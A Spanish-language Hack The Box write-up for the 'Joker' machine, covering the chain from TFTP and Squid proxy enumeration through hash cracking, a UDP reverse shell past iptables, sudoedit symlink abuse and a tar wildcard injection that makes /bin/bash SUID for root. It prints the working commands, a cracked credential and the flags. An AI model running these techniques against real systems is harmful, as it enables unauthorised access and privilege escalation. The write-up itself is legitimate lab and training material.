---
layout      : post
title       : "Maquina Joker - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Joker/Joker.png
category    : [ hackthebox ]
tags        : [ SQUID Proxy Enumeration, UDP Enumeration, Abusing TFTP, Getting Squid Proxy Credentials, Cracking Hashes, Internal port discovery via SQUID Proxy, Abusing Interactive Console, RCE Bypassing iptables rules, UDP Reverse Shell, Abusing Sudoers Privilege, Abusing sudoedit, Abusing Cron Job, Abusing TAR Wildcards  ]
---

El dia de hoy vamos a resolver `Joker` de `hackthebox` una maquina `linux` de dificultad hard. Para poder comprometer esta maquina realizaremos la enumeración de un `squid proxy` a traves del servicio `tftp` del protocolo `udp`, en donde obtenedremos unas credenciales que nos permitiran conectarnos a un servicio de consola donde podamos obtener ejecuciòn remota de comandos, evadiendo reglas `iptables` definidas; despues nos aprovecharemos de un privilegio de sudoers muy interesante para migrar a un usuario con mayores privilegios y finalmente veremos el riesgo de usar wildcards en tareas programadas que nos permitiran ganar acceso como el usuario `root` y obtener acceso total al sistema. 
 
Maquina bastante guapa asi que a darle!.

Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Joker
❯ ls

 Joker
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.10.21
PING 10.10.10.21 (10.10.10.21) 56(84) bytes of data.
64 bytes from 10.10.10.21: icmp_seq=1 ttl=63 time=106 ms

--- 10.10.10.21 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 105.889/105.889/105.889/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `63` y por proximidad seria correspondiente a una maquina `linux`.

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vv -n -Pn 10.10.10.21 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:25 GMT
Initiating SYN Stealth Scan at 23:25
Scanning 10.10.10.21 [65535 ports]
Discovered open port 22/tcp on 10.10.10.21
Discovered open port 3128/tcp on 10.10.10.21
Completed SYN Stealth Scan at 23:25, 26.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.21
Host is up, received user-set (0.12s latency).
Scanned at 2023-08-25 23:25:26 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
3128/tcp open  squid-http syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.53 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 21 (924B)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p22,3128 10.10.10.21 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:26 GMT
Nmap scan report for 10.10.10.21
Host is up (0.13s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 88:24:e3:57:10:9f:1b:17:3d:7a:f3:26:3d:b6:33:4e (RSA)
|   256 76:b6:f6:08:00:bd:68:ce:97:cb:08:e7:77:69:3d:8a (ECDSA)
|_  256 dc:91:e4:8d:d0:16:ce:cf:3d:91:82:09:23:a7:dc:86 (ED25519)
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.63 seconds
```

Visulizamos información interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH     |   OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 |
| 3128   | SQUID-HTTP    |  http-proxy Squid  |


## EXPLOTACION [#](#explotacion) {#explotacion}

Comenzamos abriendo nuestro navegador y observamos el servicio correspondiente al puerto `3128`.

![](/assets/images/HTB/htb-writeup-Joker/joker1.PNG)


Como vemos que se trata de un `squid proxy` podemos apoyarnos de nuestra extensión `foxy proxy` para agregar el proxy correspondiente a la maquina victima y asi intentar ver si al pasar con este nos muestra un contenido distinto.

![](/assets/images/HTB/htb-writeup-Joker/joker2.PNG)


Vemos que aun no podemos visualizar el contenido y que el servicio se queda cargando sin responder.

![](/assets/images/HTB/htb-writeup-Joker/joker3.PNG)


Ahora como vemos que se encuentra activo el `squid proxy` podemos intentar pasar a traves de este y intentar descubrir puertos internos de la maquina con la ayuda de `wfuzz`.

```bash
❯ wfuzz -c --hc=404 -t 20 --hh=3576 --hw=400 -z range,0-65535 -p 10.10.10.21:3128:HTTP -u http://localhost:FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://localhost:FUZZ/
Total requests: 65536

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000001:   400        151 L    416 W      3550 Ch     "0"                                                                                                                   
000000022:   407        144 L    393 W      3590 Ch     "21"                                                                                                                  
000000071:   407        144 L    393 W      3590 Ch     "70"                                                                                                                  
000000211:   407        144 L    393 W      3594 Ch     "210"                                                                                                                 
000000281:   407        144 L    393 W      3594 Ch     "280"                                                                                                                 
000000489:   407        144 L    393 W      3594 Ch     "488"                                                                                                                 
000000444:   407        144 L    393 W      3594 Ch     "443"                                                                                                                 
000000592:   407        144 L    393 W      3594 Ch     "591"                                                                                                                 
000000778:   407        144 L    393 W      3594 Ch     "777"
```

La herramienta nos reporta algunos posibles puertos que se encuentren activo de manera local, pero vimos que con `nmap` estos no se mostraban. Ahora si bien es cierto el puerto `21` no se encuentra externamente abierto, pero si consideramos los puertos por `UDP` tenemos al servicio `tftp` en el puerto `69`.

Si ahora tratamos con `nmap` de enumerar el puerto 69 por `udp` este se encuentra en esta `filtered`.

```bash
❯ nmap -p69 -sU 10.10.10.21 -n -v
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-25 23:44 GMT
Initiating Ping Scan at 23:44
Scanning 10.10.10.21 [4 ports]
Completed Ping Scan at 23:44, 0.12s elapsed (1 total hosts)
Initiating UDP Scan at 23:44
Scanning 10.10.10.21 [1 port]
Completed UDP Scan at 23:44, 1.09s elapsed (1 total ports)
Nmap scan report for 10.10.10.21
Host is up (0.11s latency).

PORT   STATE         SERVICE
69/udp open|filtered tftp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.34 seconds
           Raw packets sent: 6 (246B) | Rcvd: 4 (162B)
```

Probamos a conectarnos al servicio y al intentar extraer alguna información nos responde con un mensjae de violación.

```bash
❯ tftp 10.10.10.21
tftp> get /etc/passwd
Error code 2: Access violation
tftp> get /etc/
Error code 2: Access violation
tftp>
```

Como ya previamente sabemos que se esta ejecutando el servicio de `squid proxy`, podemos intentar traernos el archivo de configuración, que por defecto se encuentra en la ruta
`/etc/squid/squid.conf`.

```bash
❯ tftp 10.10.10.21
tftp> get /etc/squid/squid.conf
Received 295428 bytes in 66.4 seconds
tftp>
```

Conseguimos traernos el archivo y si ahora lo cateamos vemos un contenido interesante.

```bash
❯ ls
 squid.conf
❯ /bin/cat squid.conf | grep -v "^#" | sed '/^\s*$/d'
acl SSL_ports port 443
acl Safe_ports port 80		# http
acl Safe_ports port 21		# ftp
acl Safe_ports port 443		# https
acl Safe_ports port 70		# gopher
acl Safe_ports port 210		# wais
acl Safe_ports port 1025-65535	# unregistered ports
acl Safe_ports port 280		# http-mgmt
acl Safe_ports port 488		# gss-http
acl Safe_ports port 591		# filemaker
acl Safe_ports port 777		# multiling http
acl CONNECT method CONNECT
http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access deny manager
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
auth_param basic realm kalamari
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:		1440	20%	10080
refresh_pattern ^gopher:	1440	0%	1440
refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
refresh_pattern .		0	20%	4320
```

Podemos observar una ruta que contiene contraseñas, asi que vamos a proceder a traernos el archivo y obtenemos unas credenciales hasheadas.

```bash
❯ tftp 10.10.10.21
tftp> get /etc/squid/passwords
Received 48 bytes in 0.1 seconds
❯ /bin/cat passwords
kalamari:$apr1$zyzBxQYW$pL360IoLQ5Yum5SLTph.l0
```

Vamos a proceder a crackearlas con `john` y obtenemos unas credenciales validas `kalamari:ihateseafood`

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ihateseafood     (kalamari)
1g 0:00:00:19 DONE (2023-08-25 23:57) 0.05173g/s 378636p/s 378636c/s 378636C/s ihateyou456!..ihatepz
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ya que contamos con credenciales validas, podemos usarlas para el proxy que anteriormente agregamos.


![](/assets/images/HTB/htb-writeup-Joker/joker4.PNG)


Como ahora estamos pasando correctamente por el proxy, podemos enumerar los servicios de la maquina victima como si estuvieramos localmente.


Si accedemos a nuestra ip local, vemos que en el puerto 80 hay un contenido diferente que corresponde a `shorty url`


![](/assets/images/HTB/htb-writeup-Joker/joker5.PNG)


Ya que estamos en otro servicio, podemos enumerar rutas disponibles y esta vez emplearemos `gobuster` para hacerlo.

```bash
❯ gobuster dir -t 150 -u http://127.0.0.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --proxy http://kalamari:ihateseafood@10.10.10.21:3128
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://kalamari:ihateseafood@10.10.10.21:3128
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/08/26 00:11:32 Starting gobuster in directory enumeration mode
===============================================================
/list                 (Status: 301) [Size: 251] [--> http://127.0.0.1/list/]
/console              (Status: 200) [Size: 1479]
```

Encontramos la ruta console y si vemos el contenido, tenemos acceso a una consola interactiva.

![](/assets/images/HTB/htb-writeup-Joker/joker6.PNG)

Si interactuamos vemos que podemos ejecutar comandos.


![](/assets/images/HTB/htb-writeup-Joker/joker7.PNG)

Si queremos enviarnos una conexión a nuestra maquina usando `nc` no tenemos exito, pero si visualizamos las reglas de conexión permitidas, observamos que solo estan permitidas las conexiones por `tcp` del puerto 22 y 3128 y al contrario por `udp` todas las conexiones estan permitidas.

![](/assets/images/HTB/htb-writeup-Joker/joker8.PNG)

```bash
'# Generated by iptables-save v1.6.0 on Fri May 19 18:01:16 2017
*filter
:INPUT DROP [41573:1829596]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [878:221932]
-A INPUT -i ens33 -p tcp -m tcp --dport 22 -j ACCEPT
-A INPUT -i ens33 -p tcp -m tcp --dport 3128 -j ACCEPT
-A INPUT -i ens33 -p udp -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m state --state NEW -j DROP
COMMIT
# Completed on Fri May 19 18:01:16 2017'  
```

Teniendo en cuenta que por `udp` todo esta permitido, vamos a mandarnos la conexión a traves de udp, solo debemos añadir el parametro `-u`.


![](/assets/images/HTB/htb-writeup-Joker/joker9.PNG)

Nos ponemos en escucha y recibimos la conexión.

```bash
❯ ncat -nlvp 443 -u
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.21.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
werkzeug
```

Lo que sigue como de costumbre es obtener una tty full interactiva.

```bash
$ script /dev/null -c bash
Script started, file is /dev/null
werkzeug@joker:~$ ^Z     
zsh: suspended  ncat -nlvp 443 -u
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443 -u
                                   reset xterm
werkzeug@joker:~$ export term=XTERM
werkzeug@joker:~$ export shell=BASH
werkzeug@joker:~$ stty rows 45 columns 184
```

Una vez en el sitema como el usuario `werkzeug`, vemos que tenemos asignado un permiso a nivel de sudoers donde podemos ejecutar el comando `sudoedit` como el usuario `alekos` sin proporcionar contraseña.

```bash
werkzeug@joker:~$ sudo -l
Matching Defaults entries for werkzeug on joker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, sudoedit_follow, !sudoedit_checkdir

User werkzeug may run the following commands on joker:
    (alekos) NOPASSWD: sudoedit /var/www/*/*/layout.html
```

Observamos que podemos ejecutar un archivo de nombre `layout.html` que se encuentra en cualquier directorio dentro de la ruta `/var/www/*`

```bash
werkzeug@joker:~$ ls -l
total 12
-rwxr-x--- 1 root     werkzeug  581 May 18  2017 manage-shorty.py
drwxr-x--- 5 root     werkzeug 4096 May 18  2017 shorty
drwxr-xr-x 2 werkzeug werkzeug 4096 May 18  2017 testing
werkzeug@joker:~$ cd testing/
werkzeug@joker:~/testing$ ls
layout.html
```

Vemos que dentro del directorio testing se encuentra un archivo `layout.html`, pero segun el privilegio que tenemos asignado el archivo `layout.html` debe encontrarse dentro de dos subdirectorios cualquiera.

Y dado que tenemos permiso de escritura en `testing`, podemos crear dentro de este otro directorio y dentro el archivo `layout.html`.

```bash
werkzeug@joker:~$ cd testing/
werkzeug@joker:~/testing$ mkdir test
werkzeug@joker:~/testing$ cd !$
cd test
werkzeug@joker:~/testing/test$ touch layout.html
```

Si ahora usamos el comando `sudoedit` vemos que no nos pide proporcionar contraseña.

```bash
werkzeug@joker:~/testing/test$ sudoedit -u alekos /var/www/testing/test/layout.html 
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue
```

Al ver esto, lo que podemos tratar de hacer es aprovecharnos de este permiso y aprovecharnos del principio basico de claves rsa, mediante el cual al creemos el archivo `layout.html` y que este sea un link simbolico a `/home/alekos/.ssh/authorized_keys`, donde al insertar nuestra clave publica como `authorized_keys`, podamos conectarnos sin necesidad de proporcionar una contraseña y al poder editar este archivo como el usuario `alekos` sera este el que ejecute la acción. 

De este modo sera como si estuvieramos insertando nuestra clave publica mediante el archivo layout.html a el directorio `.ssh` del usuario alekos.

```bash
werkzeug@joker:~/testing/test$ ln -s -f /home/alekos/.ssh/authorized_keys layout.html 
werkzeug@joker:~/testing/test$ sudoedit -u alekos /var/www/testing/test/layout.html 
Unable to create directory /var/www/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

werkzeug@joker:~/testing/test$ cat layout.html 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYvqYRwqRrHydQfmmP56U9Wkec5IS2odMcoFxXppd5IPdzzf6CIv3skuKorlyi8HZCbsHnhm57Fqzn3PZWZ7pp5rgFzTPneh4a4W7NJONRxsuRwT4SWWNzmSjINyQrWurhctekrh3rRuhDwtSIz9rTjFKNCsmTbk6Qm3Fx3+JfYuKhuq4lNwSo3QqU2+yNv+svzzs66sdq+E/2Z0bhoi5bubhwj5g739A5odh57Hey9AfNtsK9vcVOpL+yH9RAwNHfRSHxM8GJrInMc3Twb9a8FQ8MSNO7gXd2+ykRqP0L8TkNJMggNTpmCZctL7a1wJHbTjcj68JO9nmFJgyh0BZQ8wlQetcDgo0yQ3jIhoIvN7GzPyJbo5X3cFhw/2gXSxWVLRwk6e7RQELp2SZeEFXN6ycimU4tbWEOrexJO2VwZQp8ZWv46ffUj4c4jYAiZ81i3wVJoko0uLcE9KENb/0E+9dnx5uMLUDNXz8x9EFwOkN1qxD3skGtR3dXMFZFRKM= root@fmiracle
```

De este modo ahora podemos conectarnos como el usuario `alekos`.

```bash
❯ ssh alekos@10.10.10.21
The authenticity of host '10.10.10.21 (10.10.10.21)' can't be established.
ECDSA key fingerprint is SHA256:1yj4blzJwO5TYIZYFB3HMwXEqeflHc2iF1Idp3lZ94k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.21' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.10 (GNU/Linux 4.8.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Sat May 20 16:38:08 2017 from 10.10.13.210
alekos@joker:~$
```

Ahora podemos dirigirnos a su directorio personal y visualizar la primera flag `user.txt`.

```bash
alekos@joker:~$ ls
backup  development  user.txt
alekos@joker:~$ cat user.txt 
fcbfa16ff0623562479c4a6a7e4897ba
```

## ELEVACION DE PRIVILEGIOS [#](#elevacion-de-privilegios) {#elevacion-de-privilegios}

Listando el contenido del directorio de `alekos`, vemos dos directorio uno de `development` el cual contiene scripts en `python` y el directorio `backup` el cual contiene archivos comprimidos con `tar`.

```bash
alekos@joker:~$ ls
backup  development  user.txt
alekos@joker:~$ cd development/
alekos@joker:~/development$ ls
__init__.py  application.py  data  models.py  static  templates  utils.py  views.py
alekos@joker:~/development$ cd ..
alekos@joker:~$ cd backup/
alekos@joker:~/backup$ ls
dev-1514134201.tar.gz  dev-1693005901.tar.gz  dev-1693006801.tar.gz  dev-1693007701.tar.gz  dev-1693008601.tar.gz  dev-1693009501.tar.gz  dev-1693010402.tar.gz
dev-1514134501.tar.gz  dev-1693006201.tar.gz  dev-1693007101.tar.gz  dev-1693008001.tar.gz  dev-1693008902.tar.gz  dev-1693009801.tar.gz  dev-1693010701.tar.gz
dev-1693005601.tar.gz  dev-1693006501.tar.gz  dev-1693007401.tar.gz  dev-1693008301.tar.gz  dev-1693009201.tar.gz  dev-1693010101.tar.gz  dev-1693011002.tar.gz
```

Si descomprimimos alguno de los comprimidos, obsevamos que dentro de este vemos los mismos archivos que se encontraban en la ruta `development`. Podemos intuir entonces que mediante una tarea que se ejecuta a intervalos regulares de tiempo, se esta comprimiendo todo el contenido del directorio `development` y lo esta almancenando en `backup`.

```bash
alekos@joker:~/backup$ cp dev-1514134201.tar.gz /tmp/
alekos@joker:~/backup$ cd /tmp/
alekos@joker:/tmp$ ls
dev-1514134201.tar.gz  f  systemd-private-67c5a0aba61c4233b0464cb22f25c7cb-systemd-timesyncd.service-5cvsvV  vmware-root
alekos@joker:/tmp$ mkdir test
alekos@joker:/tmp$ cd test/
alekos@joker:/tmp/test$ mv ../dev-1514134201.tar.gz .
alekos@joker:/tmp/test$ tar -xf dev-1514134201.tar.gz 
alekos@joker:/tmp/test$ ls
__init__.py  application.py  data  dev-1514134201.tar.gz  models.py  static  templates  utils.py  views.py
```

Viendo esto lo mas probable es que se este usando `tar`, ejecutandolo de esta manera `tar -cf /development/*` y dado el caso podriamos aprovechar el uso de Wildcards y tratar de obtener una shell.


Si usamos nuestra web de confianza:

* [gtfobins - tar](https://gtfobins.github.io/gtfobins/tar/#shell)


Vemos que para obtener una shell, podemos hacerlo con los siguientes parametros.

![](/assets/images/HTB/htb-writeup-Joker/joker10.PNG)

Y como se esta utilizando Wildcards, podemos crearnos dos archivos de nombre `--checkpoint=1` y `--checkpoint-action=exec=EJECUTA LO QUE QUIERAS`.

Para ello al crear los archivos que contienen `-`, debemos anteponer `--` para hacerlo correctamente.

En el segundo archivo que corresponde a la ejecución, voy a crearme un archivo en python el cual otorgue el permiso `suid` a la bash.

```python
alekos@joker:~/development$ cat abusing_wildcard.py 
import os

os.system("chmod u+s /bin/bash")
```

y seguidamente voy a crear los dos archivos necesarios, de modo que al ejecutarse el comando `tar` sobre todos los archivos tomara los nombres de estos dos ultimos como parametros y en consecuencia ejecutara el comando asignado, otorgando el privilegio `suid` a la bash.

```bash
alekos@joker:~/development$ touch -- --checkpoint=1
alekos@joker:~/development$ touch -- '--checkpoint-action=exec=python abusing_wildcard.py'
alekos@joker:~/development$ ls -l
total 32
-rw-rw-r-- 1 alekos alekos    0 Aug 26 04:05 --checkpoint-action=exec=python abusing_wildcard.py
-rw-rw-r-- 1 alekos alekos    0 Aug 26 04:04 --checkpoint=1
-rw-r----- 1 alekos alekos    0 May 18  2017 __init__.py
-rw-rw-r-- 1 alekos alekos   44 Aug 26 04:07 abusing_wildcard.py
-rw-r----- 1 alekos alekos 1452 May 18  2017 application.py
drwxrwx--- 2 alekos alekos 4096 May 18  2017 data
-rw-r----- 1 alekos alekos  997 May 18  2017 models.py
drwxr-x--- 2 alekos alekos 4096 May 18  2017 static
drwxr-x--- 2 alekos alekos 4096 May 18  2017 templates
-rw-r----- 1 alekos alekos 2500 May 18  2017 utils.py
-rw-r----- 1 alekos alekos 1748 May 18  2017 views.py
```

Pasado unos minutos listamos la bash y vemos que se le dio el permiso correspondiente de manera exitosa.

```bash
alekos@joker:~/development$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1041576 May 16  2017 /bin/bash
```

Finalmente lo que nos quedaria por hacer es convertimos como el usuario `root` y leer la segunda flag `root.txt`.

```bash
alekos@joker:~/development$ bash -p
bash-4.3# whoami
root
bash-4.3# cd /root/
bash-4.3# cat root.txt 
bash-4.3# cat root.txt 
90fcbcbbb01891eec43448b6b6d7051b
```

